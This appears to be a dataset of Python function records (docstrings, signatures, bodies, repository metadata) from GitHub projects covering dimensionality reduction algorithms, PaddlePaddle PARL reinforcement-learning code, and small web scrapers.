{"docstring": "'''\nreset deafault graph\n:param seed: random seed\n:return:\n'''\n", "func_signal": "def reset_graph(seed=42):\n", "code": "tf.reset_default_graph()\ntf.set_random_seed(seed)\nnp.random.seed(seed)", "path": "dimensionality_reduction_alo_codes/codes/AutoEncoder/AutoEncoder.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "#Generate a swiss roll dataset.\n", "func_signal": "def make_swiss_roll(n_samples=100, noise=0.0, random_state=None):\n", "code": "t = 1.5 * np.pi * (1 + 2 * np.random.rand(1, n_samples))\nx = t * np.cos(t)\ny = 83 * np.random.rand(1, n_samples)\nz = t * np.sin(t)\nX = np.concatenate((x, y, z))\nX += noise * np.random.randn(3, n_samples)\nX = X.T\nt = np.squeeze(t)\nreturn X, t", "path": "dimensionality_reduction_alo_codes/codes/LLE/LLE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\n\npca is O(D^3)\n:param data: (n_samples, n_features(D))\n:param n_dim: target dimensions\n:return: (n_samples, n_dim)\n'''\n", "func_signal": "def pca(data, n_dim):\n", "code": "data = data - np.mean(data, axis = 0, keepdims = True)\n\ncov = np.dot(data.T, data)\n\neig_values, eig_vector = np.linalg.eig(cov)\n# print(eig_values)\nindexs_ = np.argsort(-eig_values)[:n_dim]\npicked_eig_values = eig_values[indexs_]\npicked_eig_vector = eig_vector[:, indexs_]\ndata_ndim = np.dot(data, picked_eig_vector)\nreturn data_ndim", "path": "dimensionality_reduction_alo_codes/codes/PCA/PCA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u8ba1\u7b97pairwise \u8ddd\u79bb, x\u662fmatrix\n(a-b)^2 = a^2 + b^2 - 2*a*b\n'''\n", "func_signal": "def cal_pairwise_dist(x):\n", "code": "sum_x = np.sum(np.square(x), 1)\ndist = np.add(np.add(-2 * np.dot(x, x.T), sum_x).T, sum_x)\n#\u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u70b9\u4e4b\u95f4\u8ddd\u79bb\u7684\u5e73\u65b9\nreturn dist", "path": "dimensionality_reduction_alo_codes/codes/LLE/LLE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "#data number\n", "func_signal": "def create_data():\n", "code": "n = 500\n#data time\nT = [0.1*xi for xi in range(0, n)]\n#source\nS = array([[sin(xi)  for xi in T], [f1(xi) for xi in T]], float32)\n#mix matrix\nA = array([[0.8, 0.2], [-0.3, -0.7]], float32)\nreturn T, S, dot(A, S)", "path": "dimensionality_reduction_alo_codes/codes/ICA/ICA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u8ba1\u7b97pairwise \u8ddd\u79bb, x\u662fmatrix\n(a-b)^2 = a^2 + b^2 - 2*a*b\n'''\n", "func_signal": "def cal_pairwise_dist(x):\n", "code": "sum_x = np.sum(np.square(x), 1)\n# print -2 * np.dot(x, x.T)\n# print np.add(-2 * np.dot(x, x.T), sum_x).T\ndist = np.add(np.add(-2 * np.dot(x, x.T), sum_x).T, sum_x)\n#\u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u70b9\u4e4b\u95f4\u8ddd\u79bb\u7684\u5e73\u65b9\nreturn dist", "path": "dimensionality_reduction_alo_codes/codes/MDS/MDS_tensorflow.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\n\n:param data: (n_samples, n_features)\n:param n_neighbors: n nearest neighbors\n:return: neighbors indexs\n'''\n\n", "func_signal": "def get_n_neighbors(data, n_neighbors = 10):\n", "code": "dist = cal_pairwise_dist(data)\ndist[dist < 0] = 0\ndist = dist**0.5\nn = dist.shape[0]\nN = np.zeros((n, n_neighbors))\n\nfor i in range(n):\n    index_ = np.argsort(dist[i])[1:n_neighbors+1]\n    N[i] = N[i] + index_\n\nreturn N.astype(np.int32)", "path": "dimensionality_reduction_alo_codes/codes/LLE/LLE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\n\n:param data: (n_samples, n_features)\n:param n_dims:\n:param learning_rate:\n:return: (n_samples, n_dims)\n'''\n", "func_signal": "def tensor_mds(data, n_dims = 2, learning_rate = 1.0):\n", "code": "n, feature = data.shape\ntf.reset_default_graph()\nX_dist = cal_pairwise_dist(data)\n\nX = tf.placeholder(name = \"X\", dtype = tf.float32, shape=[n, n])\nY = tf.get_variable(name = \"Y\",\n                    shape = [n, n_dims],\n                    initializer=tf.random_uniform_initializer())\n\nsum_y = tf.reduce_sum(tf.square(Y), 1)\nY_dist = tf.add(tf.transpose(tf.add(-2*tf.matmul(Y, tf.transpose(Y)), sum_y)), sum_y)\n\nloss = tf.log(tf.reduce_sum(tf.square((X - Y_dist))))\n\noptimizer = tf.train.AdamOptimizer(learning_rate = learning_rate)\ntraining_op = optimizer.minimize(loss)\ninit = tf.global_variables_initializer()\n\nn_epochs = 1000\n\nwith tf.Session() as sess:\n    init.run()\n    for i in range(n_epochs):\n        training_op.run(feed_dict={X:X_dist})\n        if i % 200 == 0:\n            loss_val = loss.eval(feed_dict={X:X_dist})\n            print(\"loss: \", loss_val)\n\n    data_2d = sess.run(Y)\nreturn data_2d", "path": "dimensionality_reduction_alo_codes/codes/MDS/MDS_tensorflow.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "#Generate a swiss roll dataset.\n", "func_signal": "def make_swiss_roll(n_samples=100, noise=0.0, random_state=None):\n", "code": "t = 1.5 * np.pi * (1 + 2 * np.random.rand(1, n_samples))\nx = t * np.cos(t)\ny = 83 * np.random.rand(1, n_samples)\nz = t * np.sin(t)\nX = np.concatenate((x, y, z))\nX += noise * np.random.randn(3, n_samples)\nX = X.T\nt = np.squeeze(t)\nreturn X, t", "path": "dimensionality_reduction_alo_codes/codes/LE/LE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u8ba1\u7b97pairwise \u8ddd\u79bb, x\u662fmatrix\n(a-b)^2 = a^2 + b^2 - 2*a*b\n'''\n", "func_signal": "def cal_pairwise_dist(x):\n", "code": "sum_x = np.sum(np.square(x), 1)\ndist = np.add(np.add(-2 * np.dot(x, x.T), sum_x).T, sum_x)\n#\u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u70b9\u4e4b\u95f4\u8ddd\u79bb\u7684\u5e73\u65b9\nreturn dist", "path": "dimensionality_reduction_alo_codes/codes/ISOMAP/ISOMAP.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\n\nwhen n_features(D) >> n_samples(N), highdim_pca is O(N^3)\n\n:param data: (n_samples, n_features)\n:param n_dim: target dimensions\n:return: (n_samples, n_dim)\n'''\n", "func_signal": "def highdim_pca(data, n_dim):\n", "code": "N = data.shape[0]\ndata = data - np.mean(data, axis = 0, keepdims = True)\n\nNcov = np.dot(data, data.T)\n\nNeig_values, Neig_vector = np.linalg.eig(Ncov)\nindexs_ = np.argsort(-Neig_values)[:n_dim]\nNpicked_eig_values = Neig_values[indexs_]\n# print(Npicked_eig_values)\nNpicked_eig_vector = Neig_vector[:, indexs_]\n# print(Npicked_eig_vector.shape)\n\npicked_eig_vector = np.dot(data.T, Npicked_eig_vector)\npicked_eig_vector = picked_eig_vector/(N*Npicked_eig_values.reshape(-1, n_dim))**0.5\n# print(picked_eig_vector.shape)\n\ndata_ndim = np.dot(data, picked_eig_vector)\nreturn data_ndim", "path": "dimensionality_reduction_alo_codes/codes/PCA/PCA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u4e8c\u5206\u641c\u7d22\u5bfb\u627ebeta,\u5e76\u8ba1\u7b97pairwise\u7684prob\n'''\n\n# \u521d\u59cb\u5316\u53c2\u6570\n", "func_signal": "def seach_prob(x, tol=1e-5, perplexity=30.0):\n", "code": "print(\"Computing pairwise distances...\")\n(n, d) = x.shape\ndist = cal_pairwise_dist(x)\ndist[dist < 0] = 0\npair_prob = np.zeros((n, n))\nbeta = np.ones((n, 1))\n# \u53d6log\uff0c\u65b9\u4fbf\u540e\u7eed\u8ba1\u7b97\nbase_perp = np.log(perplexity)\n\nfor i in range(n):\n    if i % 500 == 0:\n        print(\"Computing pair_prob for point %s of %s ...\" %(i,n))\n\n    betamin = -np.inf\n    betamax = np.inf\n    perp, this_prob = cal_perplexity(dist[i], i, beta[i])\n\n    # \u4e8c\u5206\u641c\u7d22,\u5bfb\u627e\u6700\u4f73sigma\u4e0b\u7684prob\n    perp_diff = perp - base_perp\n    tries = 0\n    while np.abs(perp_diff) > tol and tries < 50:\n        if perp_diff > 0:\n            betamin = beta[i].copy()\n            if betamax == np.inf or betamax == -np.inf:\n                beta[i] = beta[i] * 2\n            else:\n                beta[i] = (beta[i] + betamax) / 2\n        else:\n            betamax = beta[i].copy()\n            if betamin == np.inf or betamin == -np.inf:\n                beta[i] = beta[i] / 2\n            else:\n                beta[i] = (beta[i] + betamin) / 2\n\n        # \u66f4\u65b0perb,prob\u503c\n        perp, this_prob = cal_perplexity(dist[i], i, beta[i])\n        perp_diff = perp - base_perp\n        tries = tries + 1\n    # \u8bb0\u5f55prob\u503c\n    pair_prob[i,] = this_prob\nprint(\"Mean value of sigma: \", np.mean(np.sqrt(1 / beta)))\n#\u6bcf\u4e2a\u70b9\u5bf9\u5176\u4ed6\u70b9\u7684\u6761\u4ef6\u6982\u7387\u5206\u5e03pi\\j\nreturn pair_prob", "path": "dimensionality_reduction_alo_codes/codes/T-SNE/TSNE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "\"\"\"Runs t-SNE on the dataset in the NxD array x\nto reduce its dimensionality to no_dims dimensions.\nThe syntaxis of the function is Y = tsne.tsne(x, no_dims, perplexity),\nwhere x is an NxD NumPy array.\n\"\"\"\n\n# Check inputs\n", "func_signal": "def tsne(x, no_dims=2, perplexity=30.0, max_iter=1000):\n", "code": "if isinstance(no_dims, float):\n    print(\"Error: array x should have type float.\")\n    return -1\n\n(n, d) = x.shape\n\n# \u52a8\u91cf\ninitial_momentum = 0.5\nfinal_momentum = 0.8\neta = 500\nmin_gain = 0.01\n# \u968f\u673a\u521d\u59cb\u5316Y\ny = np.random.randn(n, no_dims)\n# dy\u68af\u5ea6\ndy = np.zeros((n, no_dims))\n# iy\u662f\u4ec0\u4e48\niy = np.zeros((n, no_dims))\n\ngains = np.ones((n, no_dims))\n\n# \u5bf9\u79f0\u5316\nP = seach_prob(x, 1e-5, perplexity)\nP = P + np.transpose(P)\nP = P / np.sum(P)   #pij\n# early exaggeration\n# pi\\j\uff0c\u63d0\u524d\u5938\u5927\nprint (\"T-SNE DURING:%s\" % time.clock())\nP = P * 4\nP = np.maximum(P, 1e-12)\n\n# Run iterations\nfor iter in range(max_iter):\n    # Compute pairwise affinities\n    sum_y = np.sum(np.square(y), 1)\n    num = 1 / (1 + np.add(np.add(-2 * np.dot(y, y.T), sum_y).T, sum_y))\n    num[range(n), range(n)] = 0\n    Q = num / np.sum(num)   #qij\n    Q = np.maximum(Q, 1e-12)    #X\u4e0eY\u9010\u4f4d\u6bd4\u8f83\u53d6\u5176\u5927\u8005\n\n    # Compute gradient\n    # np.tile(A,N) \u91cd\u590d\u6570\u7ec4AN\u6b21 [1],5 [1,1,1,1,1]\n    # pij-qij\n    PQ = P - Q\n    # \u68af\u5ea6dy\n    for i in range(n):\n        dy[i,:] = np.sum(np.tile(PQ[:,i] * num[:,i], (no_dims, 1)).T * (y[i,:] - y), 0)\n\n    # Perform the update\n    if iter < 20:\n        momentum = initial_momentum\n    else:\n        momentum = final_momentum\n\n    gains = (gains + 0.2) * ((dy > 0) != (iy > 0)) + (gains * 0.8) * ((dy > 0) == (iy > 0))\n    gains[gains < min_gain] = min_gain\n    # \u8fed\u4ee3\n    iy = momentum * iy - eta * (gains * dy)\n    y = y + iy\n    y = y - np.tile(np.mean(y, 0), (n, 1))\n    # Compute current value of cost function\\\n    if (iter + 1) % 100 == 0:\n        C = np.sum(P * np.log(P / Q))\n        print(\"Iteration \", (iter + 1), \": error is \", C)\n        if (iter+1) != 100:\n            ratio = C/oldC\n            print(\"ratio \", ratio)\n            if ratio >= 0.95:\n                break\n        oldC = C\n    # Stop lying about P-values\n    if iter == 100:\n        P = P / 4\nprint(\"finished training!\")\nreturn y", "path": "dimensionality_reduction_alo_codes/codes/T-SNE/TSNE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "\"\"\"\n\nArgs:\n    algorithm (`parl.Algorithm`): algorithm to be used in this agent.\n    config (dict): config file describing the training hyper-parameters(see a2c_config.py)\n\"\"\"\n\n", "func_signal": "def __init__(self, algorithm, config):\n", "code": "self.obs_shape = config['obs_shape']\nsuper(AtariAgent, self).__init__(algorithm)\n\nself.lr_scheduler = LinearDecayScheduler(config['start_lr'],\n                                         config['max_sample_steps'])\n\nself.entropy_coeff_scheduler = PiecewiseScheduler(\n    config['entropy_coeff_scheduler'])", "path": "PARL/examples/A2C/atari_agent.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Returns a Python dict containing parameters of current model.\n\nReturns: a Python dict containing the parameters of current model.\n\"\"\"\n", "func_signal": "def get_weights(self):\n", "code": "weights = self.state_dict()\nfor key in weights.keys():\n    weights[key] = weights[key].cpu().numpy()\nreturn weights", "path": "PARL/parl/core/torch/model.py", "commit_date": "2020-12-07 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nDeserialize the data generated by `dumps_return`.\n\nArgs:\n    data: the output of `dumps_return`\n\nReturns:\n    deserialized data\n\"\"\"\n", "func_signal": "def loads_return(data):\n", "code": "try:\n    ret = deserialize(data)\nexcept Exception as e:\n    raise DeserializeError(e)\n\nreturn ret", "path": "PARL/parl/remote/communication.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nRestore bytes data to their initial data formats.\n\nArgs:\n    data: the output of `dumps_argument`.\n\nReturns:\n    deserialized arguments [args, kwargs]\n    like the input of `dumps_argument`, args is a tuple, and kwargs is a dict \n\"\"\"\n", "func_signal": "def loads_argument(data):\n", "code": "try:\n    ret = deserialize(data)\nexcept Exception as e:\n    raise DeserializeError(e)\n\nreturn ret", "path": "PARL/parl/remote/communication.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Missing associated documentation comment in .proto file.\"\"\"\n", "func_signal": "def Send(self, request, context):\n", "code": "context.set_code(grpc.StatusCode.UNIMPLEMENTED)\ncontext.set_details('Method not implemented!')\nraise NotImplementedError('Method not implemented!')", "path": "PARL/parl/remote/grpc_heartbeat/heartbeat_pb2_grpc.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nArgs:\n    obs_np: a numpy float32 array of shape ([B] + observation_space).\n            Format of image input should be NCHW format.\n\nReturns:\n    values: a numpy float32 array of shape [B]\n\"\"\"\n", "func_signal": "def value(self, obs_np):\n", "code": "obs_np = obs_np.astype('float32')\n\nvalues = self.fluid_executor.run(\n    self.value_program, feed={'obs': obs_np},\n    fetch_list=[self.values])[0]\nreturn values", "path": "PARL/examples/A2C/atari_agent.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nSerialize the return data of a function.\n\nArgs:\n    data: the output of a function.\n\nReturns:\n    Implementation-dependent object in bytes.\n\"\"\"\n", "func_signal": "def dumps_return(data):\n", "code": "try:\n    ret = serialize(data)\nexcept Exception as e:\n    raise SerializeError(e)\n\nreturn ret", "path": "PARL/parl/remote/communication.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\" Policy Gradient algorithm\n\nArgs:\n    model (parl.Model): policy\u7684\u524d\u5411\u7f51\u7edc.\n    lr (float): \u5b66\u4e60\u7387.\n\"\"\"\n\n", "func_signal": "def __init__(self, model, lr=None):\n", "code": "self.model = model\nassert isinstance(lr, float)\nself.lr = lr", "path": "PARL/examples/tutorials/lesson4/policy_gradient/algorithm.py", "commit_date": "2020-06-10 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Constructor.\n\nArgs:\n    channel: A grpc.Channel.\n\"\"\"\n", "func_signal": "def __init__(self, channel):\n", "code": "self.Send = channel.unary_unary(\n    '/GrpcHeartbeat/Send',\n    request_serializer=heartbeat__pb2.Request.SerializeToString,\n    response_deserializer=heartbeat__pb2.Reply.FromString,\n)", "path": "PARL/parl/remote/grpc_heartbeat/heartbeat_pb2_grpc.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nArgs:\n    obs_np: a numpy float32 array of shape ([B] + observation_space).\n            Format of image input should be NCHW format.\n\nReturns:\n    sample_ids: a numpy int64 array of shape [B]\n\"\"\"\n", "func_signal": "def predict(self, obs_np):\n", "code": "obs_np = obs_np.astype('float32')\n\npredict_actions = self.fluid_executor.run(\n    self.predict_program,\n    feed={'obs': obs_np},\n    fetch_list=[self.predict_actions])[0]\nreturn predict_actions", "path": "PARL/examples/A2C/atari_agent.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nArgs:\n    obs_np: a numpy float32 array of shape ([B] + observation_space).\n            Format of image input should be NCHW format.\n\nReturns:\n    sample_ids: a numpy int64 array of shape [B]\n    values: a numpy float32 array of shape [B]\n\"\"\"\n", "func_signal": "def sample(self, obs_np):\n", "code": "obs_np = obs_np.astype('float32')\n\nsample_actions, values = self.fluid_executor.run(\n    self.sample_program,\n    feed={'obs': obs_np},\n    fetch_list=self.sample_outputs)\nreturn sample_actions, values", "path": "PARL/examples/A2C/atari_agent.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\nArgs:\n    obs_np: a numpy float32 array of shape ([B] + observation_space).\n            Format of image input should be NCHW format.\n    actions_np: a numpy int64 array of shape [B]\n    advantages_np: a numpy float32 array of shape [B]\n    target_values_np: a numpy float32 array of shape [B]\n\"\"\"\n\n", "func_signal": "def learn(self, obs_np, actions_np, advantages_np, target_values_np):\n", "code": "obs_np = obs_np.astype('float32')\nactions_np = actions_np.astype('int64')\nadvantages_np = advantages_np.astype('float32')\ntarget_values_np = target_values_np.astype('float32')\n\nlr = self.lr_scheduler.step(step_num=obs_np.shape[0])\nentropy_coeff = self.entropy_coeff_scheduler.step()\n\ntotal_loss, pi_loss, vf_loss, entropy = self.fluid_executor.run(\n    self.learn_program,\n    feed={\n        'obs': obs_np,\n        'actions': actions_np,\n        'advantages': advantages_np,\n        'target_values': target_values_np,\n        'lr': np.array([lr], dtype='float32'),\n        'entropy_coeff': np.array([entropy_coeff], dtype='float32')\n    },\n    fetch_list=self.learn_outputs)\nreturn total_loss, pi_loss, vf_loss, entropy, lr, entropy_coeff", "path": "PARL/examples/A2C/atari_agent.py", "commit_date": "2020-03-25 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Policy gradient algorithm\n\nArgs:\n    model (parl.Model): model defining forward network of policy.\n    lr (float): learning rate.\n\n\"\"\"\n", "func_signal": "def __init__(self, model, lr):\n", "code": "assert isinstance(lr, float)\nself.model = model\nself.optimizer = paddle.optimizer.Adam(\n    learning_rate=lr, parameters=self.model.parameters())", "path": "PARL/parl/algorithms/paddle/policy_gradient.py", "commit_date": "2020-12-04 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\" \u7528policy gradient \u7b97\u6cd5\u66f4\u65b0policy model\n\"\"\"\n", "func_signal": "def learn(self, obs, action, reward):\n", "code": "act_prob = self.model(obs)  # \u83b7\u53d6\u8f93\u51fa\u52a8\u4f5c\u6982\u7387\n# log_prob = layers.cross_entropy(act_prob, action) # \u4ea4\u53c9\u71b5\nlog_prob = layers.reduce_sum(\n    -1.0 * layers.log(act_prob) * layers.one_hot(\n        action, act_prob.shape[1]),\n    dim=1)\ncost = log_prob * reward\ncost = layers.reduce_mean(cost)\n\noptimizer = fluid.optimizer.Adam(self.lr)\noptimizer.minimize(cost)\nreturn cost", "path": "PARL/examples/tutorials/lesson4/policy_gradient/algorithm.py", "commit_date": "2020-06-10 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\n\nSerialize arguments passed to a function.\n\nargs: \n    *args, **kwargs are general a commonly used representation of arguments in python.\n\nReturns:\n    Implementation-dependent object in bytes.\n\"\"\"\n", "func_signal": "def dumps_argument(*args, **kwargs):\n", "code": "try:\n    ret = serialize([args, kwargs])\nexcept Exception as e:\n    raise SerializeError(e)\n\nreturn ret", "path": "PARL/parl/remote/communication.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Copy parameters from ``set_weights()`` to the model.\n\nArgs:\n    weights (dict): a Python dict containing the parameters.\n\"\"\"\n", "func_signal": "def set_weights(self, weights):\n", "code": "new_weights = dict()\nfor key in weights.keys():\n    new_weights[key] = torch.from_numpy(weights[key])\nself.load_state_dict(new_weights)", "path": "PARL/parl/core/torch/model.py", "commit_date": "2020-12-07 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Update model with policy gradient algorithm\n\nArgs:\n    obs (paddle tensor): shape of (batch_size, obs_dim)\n    action (paddle tensor): shape of (batch_size, 1)\n    reward (paddle tensor): shape of (batch_size, 1)\n\nReturns:\n    loss (paddle tensor): shape of (1)\n\n\"\"\"\n", "func_signal": "def learn(self, obs, action, reward):\n", "code": "prob = self.model(obs)\nlog_prob = Categorical(prob).log_prob(action)\nloss = paddle.mean(-1 * log_prob * reward)\n\nloss.backward()\nself.optimizer.step()\nself.optimizer.clear_grad()\nreturn loss", "path": "PARL/parl/algorithms/paddle/policy_gradient.py", "commit_date": "2020-12-04 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "# \u6bcf\u9694200\u4e2atraining steps\u540c\u6b65\u4e00\u6b21model\u548ctarget_model\u7684\u53c2\u6570\n", "func_signal": "def learn(self, obs, act, reward, next_obs, terminal):\n", "code": "if self.global_step % self.update_target_steps == 0:\n    self.alg.sync_target()\nself.global_step += 1\n\nact = np.expand_dims(act, -1)\nfeed = {\n    'obs': obs.astype('float32'),\n    'act': act.astype('int32'),\n    'reward': reward,\n    'next_obs': next_obs.astype('float32'),\n    'terminal': terminal\n}\ncost = self.fluid_executor.run(\n    self.learn_program, feed=feed, fetch_list=[self.cost])[0]  # \u8bad\u7ec3\u4e00\u6b21\u7f51\u7edc\nreturn cost", "path": "PARL/examples/tutorials/lesson3/dqn/agent.py", "commit_date": "2020-06-10 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Synchronize parameters of current model to another model.\n\ntarget_model_weights = decay * target_model_weights + (1 - decay) *\ncurrent_model_weights\n\nArgs:\n    target_model (`parl.Model`): an instance of ``Model`` that has the\n    same neural network architecture as the current model.\n    decay (float):  the rate of decline in copying parameters. 0 if no\n    parameters decay when synchronizing the parameters.\n\nExample:\n\n.. code-block:: python\n\n    import copy\n    # create a model that has the same neural network structures.\n    target_model = copy.deepcopy(model)\n\n    # after initializing the parameters ...\n    model.sync_weights_to(target_model)\n\nNote:\n    Before calling ``sync_weights_to``, parameters of the model must\n    have been initialized.\n\"\"\"\n\n", "func_signal": "def sync_weights_to(self, target_model, decay=0.0):\n", "code": "assert not target_model is self, \"cannot copy between identical model\"\nassert isinstance(target_model, Model)\nassert self.__class__.__name__ == target_model.__class__.__name__, \\\n    \"must be the same class for params syncing!\"\nassert (decay >= 0 and decay <= 1)\n\ntarget_vars = dict(target_model.named_parameters())\nfor name, var in self.named_parameters():\n    target_vars[name].data.copy_(decay * target_vars[name].data +\n                                 (1 - decay) * var.data)", "path": "PARL/parl/core/torch/model.py", "commit_date": "2020-12-07 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"Predict the probability of actions\n\nArgs:\n    obs (paddle tensor): shape of (obs_dim,)\n\nReturns:\n    prob (paddle tensor): shape of (action_dim,)\n\"\"\"\n", "func_signal": "def predict(self, obs):\n", "code": "prob = self.model(obs)\nreturn prob", "path": "PARL/parl/algorithms/paddle/policy_gradient.py", "commit_date": "2020-12-04 00:00:00", "repo_name": "PaddlePaddle/PARL", "stars": 3157, "license": "apache-2.0", "language": "python", "size": 48298}
{"docstring": "\"\"\"\u6267\u884c\u5165\u53e3\"\"\"\n# \u521d\u59cb\u5316\u5b58\u50a8\u6587\u4ef6\n", "func_signal": "def run(self):\n", "code": "self.init_file()\n# \u89e3\u6790\u7701\u4efd\u7684html\nprint('\u5f00\u59cb\u89e3\u6790\u7701\u4efd\u4fe1\u606f\u2026\u2026')\nhtml = self.get_html(self.url)\nsoup = BeautifulSoup(html, 'lxml')\nprovince_list = soup.select('.provincetr a')\nfor province_info in province_list:\n    province_name = province_info.get_text()\n    province_url = province_info.attrs['href']\n    province_code = province_url.split('.')[0]\n    print(province_name, province_code, province_url)\n    # \u6570\u636e\u5b58\u5165\u5b57\u5178\n    dict_info = {}\n    dict_info.update({'name': province_name})\n    dict_info.update({'code': province_code})\n    dict_info.update({'parent_code': '0'})\n    dict_info.update({'level': '1'})\n    # \u8bfb\u5199json\u6570\u636e\n    self.read_write_by_json(dict_info, 'province')\n    # \u722c\u53d6\u5e02\u7ea7\u4fe1\u606f\n    self.get_city(self.url, province_url, province_code)\nprint('\u7701\u4efd\u89e3\u6790\u7ed3\u675f\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u8bf7\u6c42html\u9875\u9762\u4fe1\u606f\"\"\"\n", "func_signal": "def get_html(self, url):\n", "code": "header = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'\n}\ntry:\n    request = requests.get(url=url, headers=header)\n    request.encoding = 'gbk'\n    html = request.text\n    return html\nexcept Exception as e:\n    return ''", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u83b7\u53d6\u6cb8\u70b9\u7684Json\u6570\u636e\"\"\"\n", "func_signal": "def get_poins(url):\n", "code": "request = requests.get(url)\npoins = request.json()\nreturn poins", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
